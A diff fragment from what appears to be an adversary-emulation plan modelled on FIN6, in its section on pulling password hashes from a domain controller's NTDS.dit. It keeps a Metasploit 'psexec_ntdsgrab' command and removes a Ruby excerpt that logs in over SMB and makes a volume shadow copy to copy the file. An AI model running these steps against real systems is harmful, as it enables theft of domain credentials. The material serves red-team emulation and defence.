@@ -324,36 +324,6 @@ Hashes must be retrieved from the NTDS.dit file. There are a number of openly av
 msf> use auxiliary/admin/smb/psexec_ntdsgrab
 ```
 
-```rb
-  # This is the main control method
-  def run
-    # Initialize some variables
-    text = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
-    bat = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
-    createvsc = "vssadmin create shadow /For=%SYSTEMDRIVE%"
-    @ip = datastore['RHOST']
-    @smbshare = datastore['SMBSHARE']
-    # Try and connect
-    if connect
-      # Try and authenticate with given credentials
-      begin
-        smb_login
-      rescue StandardError => autherror
-        print_error("Unable to authenticate with given credentials: #{autherror}")
-        return
-      end
-      # If a VSC was specified then don't try and create one
-      if datastore['VSCPATH'].length > 0
-        print_status("Attempting to copy NTDS.dit from #{datastore['VSCPATH']}")
-        vscpath = datastore['VSCPATH']
-      else
-        unless datastore['CREATE_NEW_VSC']
-          vscpath = check_vss(text, bat)
-        end
-        unless vscpath
-          vscpath = make_volume_shadow_copy(createvsc, text, bat)
-```
-
 ## Step 4 - Collection and Exfiltration
 
 FIN6
